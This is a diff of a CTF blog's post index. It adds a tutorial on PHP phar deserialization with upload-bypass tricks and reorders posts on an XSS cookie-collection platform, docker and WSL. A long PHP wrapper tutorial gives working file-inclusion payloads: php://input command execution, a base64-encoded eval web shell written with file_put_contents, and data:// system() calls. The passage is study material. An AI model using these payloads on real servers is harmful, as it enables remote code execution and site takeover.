@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>phar反序列化解析及phar文件生成</title>
+      <link href="/posts/5288e076.html"/>
+      <url>/posts/5288e076.html</url>
+      
+        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="Phar相关基础">Phar相关基础</h2><p>Phar是将php文件打包而成的一种压缩文档，类似于Java中的jar包。它有一个特性就是phar文件会以序列化的形式储存用户自定义的<code>meta-data</code>。以扩展反序列化漏洞的攻击面，配合<code>phar://</code>协议使用。</p><p>Phar是PHP的归档格式，类似Java的JAR或是.NET的ZIP。Phar文件可以在不需要解压的情况下在PHP中运行。Phar文件可以用于分发PHP代码，就像你分发Python代码时使用的是.pyc或.whl文件。</p><p>Phar伪协议是PHP的一个特性，它允许直接从Phar归档中读取文件，而不需要将Phar文件解压。这样可以直接从Phar文件运行PHP脚本，而无需在服务器上物理地提取文件。</p><h2 id="Phar文件结构">Phar文件结构</h2><ol><li><code>a stub</code>是一个文件标志，格式为 ：<code>xxx</code>。</li><li><code>manifest</code>是被压缩的文件的属性等放在这里，这部分是以序列化存储的，是主要的攻击点。</li><li><code>contents</code>是被压缩的内容。</li><li><code>signature</code>签名，放在文件末尾。</li></ol><p>就是这个文件由四部分组成，每种文件都是有它独特的一种文件格式的，有首有尾。而<code>__HALT_COMPILER();</code>就是相当于图片中的文件头的功能，没有它，图片无法解析，同样的，没有文件头，php识别不出来它是phar文件，也就无法起作用。</p><h2 id="生成phar文件">生成phar文件</h2><p>这里测试一下~<br>前提：生成phar文件需要修改php.ini中的配置，将<code>phar.readonly</code>设置为<code>Off</code><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/1637308824_61975998719c7c61c06c1.png!small" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class test&#123;</span><br><span class="line">public $name=&#x27;phpinfo();&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">$phar=new phar(&#x27;test.phar&#x27;);//后缀名必须为phar</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;);//设置stub</span><br><span class="line">$obj=new test();</span><br><span class="line">$phar-&gt;setMetadata($obj);//自定义的meta-data存入manifest</span><br><span class="line">$phar-&gt;addFromString(&quot;flag.txt&quot;,&quot;flag&quot;);//添加要压缩的文件</span><br><span class="line">//签名自动计算</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><blockquote><p>生成phar文件命令：php -d phar.readonly=0 脚本.php</p></blockquote><p>生成的phar文件，打开该文件可以看到文件头是``以及中间的部分内容是序列化的形式存在于这个文件中。<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/1637308825_619759992d43a3b586529.png!small" alt="img"></p><p>该方法在文件系统函数（<code>file_exists()</code>、<code>is_dir()</code>等）参数可控的情况下，配合phar://伪协议，可以不依赖<code>unserialize()</code>直接进行反序列化操作。<br><a href="https://paper.seebug.org/680/%E5%BE%97%E7%9F%A5%EF%BC%9A%E6%9C%89%E5%BA%8F%E5%88%97%E5%8C%96%E6%95%B0%E6%8D%AE%E5%BF%85%E7%84%B6%E4%BC%9A%E6%9C%89%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%93%8D%E4%BD%9C%EF%BC%8Cphp%E4%B8%80%E5%A4%A7%E9%83%A8%E5%88%86%E7%9A%84%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%87%BD%E6%95%B0%E5%9C%A8%E9%80%9A%E8%BF%87">https://paper.seebug.org/680/得知：有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过</a><code>phar://</code>伪协议解析phar文件时，都会将<code>meta-data</code>进行反序列化，测试后受影响的函数如下：(仿照大佬的图)<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/1637308825_61975999dcd39421b006d.png!small" alt="img"><br>这里使用<code>file_get_contents()</code>函数来进行实验。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class test&#123;</span><br><span class="line">    public $name=&#x27;&#x27;;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        eval($this-&gt;name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo file_get_contents(&#x27;phar://test.phar/flag.txt&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/1637308826_6197599ac379f0ca6ed5e.png!small" alt="img"><br><code>__HALT_COMPILER();</code>必须大写，小写不会被识别出来。导致无法进行反序列化操作。<br>因为考虑到在上传的时候，可能只会允许上传图片(<code>jpg/png/gif</code>)，上传时将test.phar修改文件扩展名为jpg也可以进行反序列化，不会影响解析。<br>如果对文件头有识别的，也可以使用GIF文件头<code>GIF89a</code>来绕过检测，具体操作与文件上传部分细节类似，不再赘述。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> web姿势 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>无参数rce详解</title>
       <link href="/posts/7d0cf4ae.html"/>
       <url>/posts/7d0cf4ae.html</url>
@@ -729,31 +754,6 @@
     
     
     <entry>
-      <title>XSS在线平台使用</title>
-      <link href="/posts/169f5f8e.html"/>
-      <url>/posts/169f5f8e.html</url>
-      
-        <content type="html"><![CDATA[<blockquote><p>前言：由于自己搭建的xss平台需要服务器才能获取其他网络的cookie，所以无法接收赛题的cookie，最简便的方法还是使用在线平台，虽然可能有一定风险，以后买服务器了再搭建自己的吧</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128191835876.png" alt="image-20241128191835876"></p><p>登录后，直接创建项目就行</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128191919585.png" alt="image-20241128191919585"></p><p>传入的地址如下：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128191232646.png" alt="image-20241128191232646"></p><p>然后就能在平台上接受到了</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128192046521.png" alt="image-20241128192046521"></p>]]></content>
-      
-      
-      <categories>
-          
-          <category> CTF </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> 其他姿势 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>CTFHub技能树-XSS</title>
       <link href="/posts/57dd66d8.html"/>
       <url>/posts/57dd66d8.html</url>
@@ -771,6 +771,31 @@
         <tags>
             
             <tag> web-wp </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>XSS在线平台使用</title>
+      <link href="/posts/169f5f8e.html"/>
+      <url>/posts/169f5f8e.html</url>
+      
+        <content type="html"><![CDATA[<blockquote><p>前言：由于自己搭建的xss平台需要服务器才能获取其他网络的cookie，所以无法接收赛题的cookie，最简便的方法还是使用在线平台，虽然可能有一定风险，以后买服务器了再搭建自己的吧</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128191835876.png" alt="image-20241128191835876"></p><p>登录后，直接创建项目就行</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128191919585.png" alt="image-20241128191919585"></p><p>传入的地址如下：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128191232646.png" alt="image-20241128191232646"></p><p>然后就能在平台上接受到了</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128192046521.png" alt="image-20241128192046521"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 其他姿势 </tag>
             
         </tags>
       
@@ -904,31 +929,6 @@
     
     
     <entry>
-      <title>docker保存和打包镜像</title>
-      <link href="/posts/5721bfe4.html"/>
-      <url>/posts/5721bfe4.html</url>
-      
-        <content type="html"><![CDATA[<h2 id="docker保存和打包镜像">docker保存和打包镜像</h2><p>作用：在现在容器镜像上保存镜像进行打包，在另一台服务上使用；或现有的容器安装了一些库，配置了开发环境，需要保存下载，下次加载后直接使用。</p><h4 id="1-1-首先查看下现有容器镜像（目的是查询需要保存镜像的ID）">1.1 首先查看下现有容器镜像（目的是查询需要保存镜像的ID）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure><h4 id="1-2-接下来用commit参数进行保存镜像（精简版）">1.2 接下来用commit参数进行保存镜像（精简版）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker commit  7ca736d99653    yolov5:v6.2</span><br></pre></td></tr></table></figure><p>其中，7ca736d99653 是需要保存镜像的ID，刚才用docker ps -a 查询到的。</p><h2 id="打包tar">打包tar</h2><p>使用save参数进行打包，格式如：docker save -o  tar文件名称     镜像REPOSITORY:TAG</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker save -o yolov5-v6.2.tar yolov5:v6.2</span><br></pre></td></tr></table></figure><p>其中yolov5:v6.2 是需要保存镜像的REPOSITORY、和TAG；也是上面保存的镜像名称。</p>]]></content>
-      
-      
-      <categories>
-          
-          <category> CTF </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> 其他姿势 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>第八届强网杯青少赛wp</title>
       <link href="/posts/2cd096fe.html"/>
       <url>/posts/2cd096fe.html</url>
@@ -946,6 +946,31 @@
         <tags>
             
             <tag> 比赛wp </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>docker保存和打包镜像</title>
+      <link href="/posts/5721bfe4.html"/>
+      <url>/posts/5721bfe4.html</url>
+      
+        <content type="html"><![CDATA[<h2 id="docker保存和打包镜像">docker保存和打包镜像</h2><p>作用：在现在容器镜像上保存镜像进行打包，在另一台服务上使用；或现有的容器安装了一些库，配置了开发环境，需要保存下载，下次加载后直接使用。</p><h4 id="1-1-首先查看下现有容器镜像（目的是查询需要保存镜像的ID）">1.1 首先查看下现有容器镜像（目的是查询需要保存镜像的ID）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure><h4 id="1-2-接下来用commit参数进行保存镜像（精简版）">1.2 接下来用commit参数进行保存镜像（精简版）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker commit  7ca736d99653    yolov5:v6.2</span><br></pre></td></tr></table></figure><p>其中，7ca736d99653 是需要保存镜像的ID，刚才用docker ps -a 查询到的。</p><h2 id="打包tar">打包tar</h2><p>使用save参数进行打包，格式如：docker save -o  tar文件名称     镜像REPOSITORY:TAG</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker save -o yolov5-v6.2.tar yolov5:v6.2</span><br></pre></td></tr></table></figure><p>其中yolov5:v6.2 是需要保存镜像的REPOSITORY、和TAG；也是上面保存的镜像名称。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 其他姿势 </tag>
             
         </tags>
       
@@ -1179,31 +1204,6 @@
     
     
     <entry>
-      <title>Windows 子系统 WSL使用系统代理</title>
-      <link href="/posts/f5bf104a.html"/>
-      <url>/posts/f5bf104a.html</url>
-      
-        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="以Ubuntu-Clash为例">以Ubuntu + Clash为例</h2><p>由Jeza Chen 发表于 June 3, 2020</p><p>最近使用WSL发现无法访问github相关的网站，基本都是Connection Refused，即便Windows系统使用了Clash也不能访问，按照网上一些教程，需要在WSL上进行一些配置才能用到系统的代理。</p><p>下面的操作基于WSL下的Ubuntu 20.04 LTS，主机代理软件为<a href="https://github.com/Dreamacro/clash">Clash</a>。</p><ol><li><p>在Clash软件找到HTTP代理端口(即软件里面的Port)，如下图的7890。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/clash-screenshot.png" alt="Clash截图"></p></li><li><p>在c盘的用户文件中创建.wslconfig文件，复制以下代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">   [experimental]</span><br><span class="line">   autoMemoryReclaim=gradual</span><br><span class="line">networkingMode=mirrored</span><br><span class="line">   dnsTunneling=true</span><br><span class="line">   firewall=true</span><br><span class="line">   autoProxy=true</span><br></pre></td></tr></table></figure></li><li><p>在WSL的终端上输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim ~/.bashrc</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">，在末行写入</span><br><span class="line">export http_proxy=127.0.0.1:7890</span><br><span class="line"></span><br><span class="line">export https_proxy=127.0.0.1:7890</span><br></pre></td></tr></table></figure><p><strong>注意这里的7890是上图Clash的HTTP代理端口号，请替换成自己本机的端口。</strong></p></li><li><p>关闭终端重新打开，此时输入<code>wget google.com</code>看看代理能不能正常工作。</p></li></ol><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/wsl-wget-google.png" alt="Wget谷歌官网截图"></p>]]></content>
-      
-      
-      <categories>
-          
-          <category> CTF </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> 其他姿势 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>ctfshow单身杯2024wp</title>
       <link href="/posts/b37bd168.html"/>
       <url>/posts/b37bd168.html</url>
@@ -1246,6 +1246,31 @@
         <tags>
             
             <tag> 比赛wp </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Windows 子系统 WSL使用系统代理</title>
+      <link href="/posts/f5bf104a.html"/>
+      <url>/posts/f5bf104a.html</url>
+      
+        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="以Ubuntu-Clash为例">以Ubuntu + Clash为例</h2><p>由Jeza Chen 发表于 June 3, 2020</p><p>最近使用WSL发现无法访问github相关的网站，基本都是Connection Refused，即便Windows系统使用了Clash也不能访问，按照网上一些教程，需要在WSL上进行一些配置才能用到系统的代理。</p><p>下面的操作基于WSL下的Ubuntu 20.04 LTS，主机代理软件为<a href="https://github.com/Dreamacro/clash">Clash</a>。</p><ol><li><p>在Clash软件找到HTTP代理端口(即软件里面的Port)，如下图的7890。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/clash-screenshot.png" alt="Clash截图"></p></li><li><p>在c盘的用户文件中创建.wslconfig文件，复制以下代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">   [experimental]</span><br><span class="line">   autoMemoryReclaim=gradual</span><br><span class="line">networkingMode=mirrored</span><br><span class="line">   dnsTunneling=true</span><br><span class="line">   firewall=true</span><br><span class="line">   autoProxy=true</span><br></pre></td></tr></table></figure></li><li><p>在WSL的终端上输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim ~/.bashrc</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">，在末行写入</span><br><span class="line">export http_proxy=127.0.0.1:7890</span><br><span class="line"></span><br><span class="line">export https_proxy=127.0.0.1:7890</span><br></pre></td></tr></table></figure><p><strong>注意这里的7890是上图Clash的HTTP代理端口号，请替换成自己本机的端口。</strong></p></li><li><p>关闭终端重新打开，此时输入<code>wget google.com</code>看看代理能不能正常工作。</p></li></ol><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/wsl-wget-google.png" alt="Wget谷歌官网截图"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 其他姿势 </tag>
             
         </tags>
       
@@ -1508,7 +1533,7 @@
       <link href="/posts/5a47ecbe.html"/>
       <url>/posts/5a47ecbe.html</url>
       
-        <content type="html"><![CDATA[<p>[TOC]</p><p>php://伪协议是php提供的一些输入输出流访问功能，允许访问php的输入输出流，标准输入输出和错误描述符，内存中，磁盘备份的临时文件流，以及可以操作其他读取和写入文件的过滤器。</p><p>首先看到题目提示传个file，遂/?file=…一个随意参数，而后得到源代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;allow_url_include&quot;,&quot;on&quot;);</span><br><span class="line">header(&quot;Content-type: text/html; charset=utf-8&quot;);</span><br><span class="line">error_reporting(0);</span><br><span class="line">$file=$_GET[&#x27;file&#x27;];</span><br><span class="line">if(isset($file))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">    echo &#x27;flag 在flag.php中&#x27;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;传入一个file试试&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">include_once($file);</span><br><span class="line">?&gt; flag 在flag.php中</span><br></pre></td></tr></table></figure><p>发现有include_once函数；<br>include_once()：在脚本执行期间包含并运行指定文件。该函数和include 函数类似，两者唯一的区别是 使用该函数的时候，php会加检查指定文件是否已经被包含过，如果是，则不会再被包含。</p><p>于是利用伪协议构造，</p><p>php://filter/convert.base64-encode/resource=flag.php</p><p>得到经过Base64加密的flag，解密即可。</p><h2 id="常见的php伪协议">常见的php伪协议</h2><p>1）file:// 访问本地文件系统</p><p>2）http:// 访问HTTP(S)网址</p><p>3）ftp:// 访问FTP(S)URL</p><p>4)php:// 访问各个输出输入流</p><p>5)zlib:// 处理压缩流</p><p>6)data:// 读取数据</p><p>7)glob:// 查找匹配的文件路径模式</p><p>8)phar:// PHP归档</p><p>9)rar:// RAR数据压缩</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/QQ%E5%9B%BE%E7%89%8720240915150327.png" alt=""></p><h2 id="协议详细：">协议详细：</h2><p>一、环境概要：<br>PHP伪协议指的是PHP所支持的协议与封装协议，在web渗透漏洞利用中常用于配合文件包含进行web攻击，从而获取网站权限。</p><p>1.php.ini配置文件参数：</p><p>allow_url_fopen ：on #默认开启 ，表示允许url里的封装协议访问文件；<br>allow_url_include：off #默认关闭，表示不允许包含url里的封装协议包含文件；<br>2.常用伪协议条件及方法</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/e5f2a0a7a079c20ae6af01a5753bdd82.png" alt="在这里插入图片描述"></p><p>3.注意点</p><p>①各个伪协议适用php版本不尽相同，以下php版本在5.2~5.7之间疯狂来回切换，到最后已经无法总结各协议实验成功所使用的php版本。总之：php&gt;5.2.0<br>②以下所有实例均使用Firefox浏览器</p><p>二、伪协议实例</p><h4 id="1-php-input">1.php://input</h4><p>php://input 是可以访问请求原始数据的只读流。在POST 请求的情况下，由于 php://input 不依赖于特定的 php.ini 指令，可以使用它代替 $HTTP_RAW_POST_DATA。</p><p>php://input   (执行post中的命令)</p><p>注意点<br>①input必须以post请求<br>②enctype=“multipart/form-data” 的时候 php://input 是无效的<br>③allow_url_include=on</p><p>实例一：php://input将文件包含漏洞变成代码执行漏洞</p><p>①目标网站存在包含漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @include($_GET[&quot;file&quot;])?&gt;</span><br></pre></td></tr></table></figure><p>②使用php://input，将执行代码通过在POST data中提交</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(&#x27;ipconfig&#x27;);?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/e5f2a0a7a079c20ae6af01a5753bdd82.png" alt=""></p><p>实例二：php://input利用文件包含写入shell</p><p>①目标网站存在包含漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @include($_GET[&quot;file&quot;])?&gt;</span><br></pre></td></tr></table></figure><p>②使用php://input，将执行代码通过在POST data中提交</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#post方式提交</span><br><span class="line">&lt;?php </span><br><span class="line">echo file_put_contents(&quot;test.php&quot;,base64_decode(&quot;PD9waHAgZXZhbCgkX1BPU1RbJ2NjJ10pPz4=&quot;));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>执行成功会在当前目录下生成一句话shell，可直接连接</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/075dbc6a76924f750b80ef7bcd0a8964.png" alt="在这里插入图片描述"></p><p>实例三：php://input协议直接写入shell</p><p>①含有php://input的代码漏洞文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$data = file_get_contents(&#x27;php://input&#x27;); </span><br><span class="line">eval($data); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>POST直接传参执行php代码：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/b14c8e1c01df529a99ef1a94150ba4f7.png" alt="在这里插入图片描述">同理，这里在post数据提交生成shell的代码，会在同级目录下生成shell：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo file_put_contents(&quot;ceshi.php&quot;,base64_decode(&quot;PD9waHAgZXZhbCgkX1BPU1RbJ2NjJ10pPz4=&quot;));</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/ab163614fd0d637a0c968b0d80ba168c.png" alt="在这里插入图片描述"></p><p>需要注意的是，此方法使用条件为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.allow_url_include = On</span><br><span class="line"></span><br><span class="line">2. PHP &gt;= 5.2.0</span><br><span class="line">3. 当前文件有写入权限</span><br></pre></td></tr></table></figure><h4 id="2-data-URL代码执行">2.data:URL代码执行</h4><p>将攻击代码转换为data:URL形式进行攻击，以传递相应格式的数据用来执行PHP代码。为了防止直接在URL连接中的一些敏感字符被waf检测拦截，可将攻击代码进行base64编码。</p><p>#文件包含代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php include $_GET[&#x27;file&#x27;]?&gt;   </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>访问执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/1.php?file=data:text/plain;base64,PD9waHAKcGhwaW5mbygpOwo/Pg==</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/0d8db3c74cf4384ce95fee2a92a3286a.png" alt=""></p><p>条件：allow_url_include = on&amp;allow_url_fopen()=on&amp; PHP &gt;= 5.2.0</p><h4 id="3-php-filter读取源代码">3.php://filter读取源代码</h4><p>php://filter用于读取网站源码。读取php文件源码内容(直接包含脚本格式文件会解析无法直接获取文件源码)。用法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.3/1.php?file=php://filter/read=convert.base64-encode/resource=1.php</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=/var/www/html/flag.php(使用base64读取源文件)</span><br></pre></td></tr></table></figure><blockquote><p>有时题目会需要我们必须包含某个字符串<br>技巧是php://filter伪协议可以套一层协议<br>比如我们需要包含woofers这个字符串：php://filter/read=convert.base64-encode/woofers/resource=index</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/81ffdc55f82671f8dcb54cf09e267f66.png" alt="在这里插入图片描述"></p><h4 id="4-file-物理路径包含文件">4.file://物理路径包含文件</h4><p>file:// 协议在allow_url_fopen,allow_url_include都为off的情况下也可以正常使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.3/1.php?filename=file:///C:\\phpStudy\\WWW\\fileinclude\\2\\1.txt</span><br></pre></td></tr></table></figure><p>file://机器的IP地址/目录/文件（这个后面不一定需要跟文件，如果只写一个目录的话就是查看该目录下有哪些文件）<br>对于本地机器，机器的IP地址变成127.0.0.1或localhost或干脆什么也不写。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/106b1e158dda18f56b78e9000c5b0dcc.png" alt="在这里插入图片描述"></p><h4 id="5-data-：利用文件包含-data-可进行命令执行">5.data://：利用文件包含&amp;data://可进行命令执行</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.3/1.php?filename=data://text/plain,%3C?php%20system(%27whoami%27);?%3E</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/42786ed141197be7c7152764d03fb81d.png" alt="在这里插入图片描述"></p><p>data协议就是会把后面的一段字符串当成php代码区执行，所以读取flag.php的文件就可以看到flag了</p><p>例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=data://text/plain,&lt;?php system(&quot;tac flag.php&quot;);?&gt;</span><br></pre></td></tr></table></figure><p>php://data/plain;base64,XXXX（base64编码后的数据）</p><p>data:text/plain,XXX</p><p>可能的编码的问题：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure><p>在编成base64的时候出现了+。而浏览器不认识+号。所以解决方法：</p><p>1.不写后面的?&gt; 因为PHP里面其实不需要写后面的 前面的；号就已经说明结束了。如果没有；号就必须写?&gt;作为结束。<br>2.添加空格改变base64编码。<br>3.将+号换成%2b<br><strong>其实不需要通过base64编码来实现！！！</strong><br><strong>将</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure><p><strong>改变成url编码。这样浏览器可以识别！</strong></p><h4 id="6-zip-绕过文件包含下的附加后缀">6.zip://绕过文件包含下的附加后缀</h4><p>以下两串代码是对文件后缀进行验证或修改然后再进行包含。对于此类情况，如果要包含非预定文件后缀的文件，可以通过%00截断进行绕过。但是%00截断在php版本5.3.4之后就失效了，而且还要考虑GPC，限制比较严重。除此之外，可以通过zip协议和phar协议来包含文件，突破附加后缀限制。</p><p>验证包含对象文件后缀是否为jpg，如果是才进行包含</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span 